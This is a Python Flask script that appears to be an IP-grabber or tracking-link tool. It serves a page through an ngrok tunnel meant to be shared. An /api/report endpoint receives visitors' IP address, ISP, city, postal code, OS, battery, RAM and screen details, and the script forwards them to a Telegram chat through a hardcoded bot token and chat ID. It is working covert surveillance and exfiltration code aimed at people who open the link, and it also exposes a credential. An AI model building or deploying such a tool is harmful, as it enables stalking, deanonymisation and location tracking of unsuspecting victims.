#!/usr/bin/env python3
import os
import time
import threading
import json
import requests
from flask import Flask, send_from_directory, request, jsonify
from flask_cors import CORS  # <-- NEW

PORT = 5000
USE_NGROK = True
NGROK_AUTH_TOKEN = None

app = Flask(__name__)
CORS(app)  # <-- Allow all origins (for the embed page)

# -------------------- Static files --------------------
@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/<path:path>')
def serve_static(path):
    return send_from_directory('.', path)

# -------------------- Telegram reporter --------------------
def detect_os(user_agent):
    ua = user_agent.lower()
    if 'windows phone' in ua: return 'Windows Phone'
    if 'windows' in ua: return 'Windows'
    if 'android' in ua: return 'Android'
    if 'ipad' in ua or 'iphone' in ua or 'ipod' in ua: return 'iOS'
    if 'mac os x' in ua: return 'macOS'
    if 'linux' in ua: return 'Linux'
    if 'cros' in ua: return 'Chrome OS'
    return 'Unknown'

def escape_html(text):
    return str(text).replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')

@app.route('/api/report', methods=['POST'])
def report():
    if request.method != 'POST':
        return jsonify({'error': 'Method not allowed'}), 405

    data = request.get_json()
    if not data:
        return jsonify({'error': 'Invalid JSON'}), 400

    user_agent = request.headers.get('User-Agent', '')
    data['os'] = detect_os(user_agent)

    from datetime import datetime
    import pytz
    tz = pytz.timezone('Asia/Manila')
    date = datetime.now(tz).strftime('%Y-%m-%d %I:%M:%S %p')

    msg = f"""
<b>📡 NEW DEVICE REPORT</b>
<b>🕒 Time:</b> {escape_html(date)}

<b>🌐 Network Info</b>
• IP: {escape_html(data.get('ip', 'Unknown'))}
• ISP: {escape_html(data.get('isp', 'Unknown'))}
• Location: {escape_html(data.get('city', 'Unknown'))}, {escape_html(data.get('region', 'Unknown'))}, {escape_html(data.get('country', 'Unknown'))}
• Timezone: {escape_html(data.get('timezone', 'Unknown'))}
• Postal: {escape_html(data.get('postal', 'Unknown'))}

<b>💻 Device Info</b>
• OS: {escape_html(data.get('os', 'Unknown'))}
• Browser: {escape_html(data.get('browser', 'Unknown'))}
• Mobile: {escape_html(str(data.get('mobile', 'Unknown')))}
• RAM: {escape_html(str(data.get('memory', 'Unknown')))} GB
• Battery: {escape_html(str(data.get('battery', 'Unknown')))}% (Charging: {escape_html(str(data.get('charging', 'Unknown')))})
• Screen: {escape_html(data.get('screen', 'Unknown'))}
• Viewport: {escape_html(data.get('viewport', 'Unknown'))}
"""

    BOT_TOKEN = '8331507630:AAFB9CwWfEkbZ9xH9NHG7VBAzrVLBVmZCR8'
    CHAT_ID = '-1003325796934'

    try:
        resp = requests.post(
            f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
            json={'chat_id': CHAT_ID, 'text': msg, 'parse_mode': 'HTML'}
        )
        resp.raise_for_status()
        print('[+] Sent device info to Telegram')
        return jsonify({'success': True}), 200
    except Exception as e:
        print(f'[!] Failed to send: {e}')
        return jsonify({'error': 'Telegram send failed'}), 500

# -------------------- Ngrok --------------------
def start_ngrok(port):
    try:
        from pyngrok import ngrok
    except ImportError:
        print("❌ pyngrok not installed. Install: pip install pyngrok")
        return
    if NGROK_AUTH_TOKEN:
        ngrok.set_auth_token(NGROK_AUTH_TOKEN)
    public_url = ngrok.connect(port)
    print(f"\n🔗 Public URL: {public_url} (share this!)")

if __name__ == '__main__':
    if not os.path.exists('index.html'):
        print("⚠️  index.html not found.")
    if not os.path.exists('send.js'):
        print("⚠️  send.js not found.")

    if USE_NGROK:
        try:
            import pyngrok
            print("🌐 Starting ngrok tunnel...")
            threading.Thread(target=start_ngrok, args=(PORT,), daemon=True).start()
            time.sleep(2)
        except ImportError:
            print("⚠️  pyngrok missing – running locally only.")
            USE_NGROK = False

    print(f"🌍 Local server: http://localhost:{PORT}")
    print("   Press Ctrl+C to stop.\n")
    app.run(host='0.0.0.0', port=PORT, debug=False)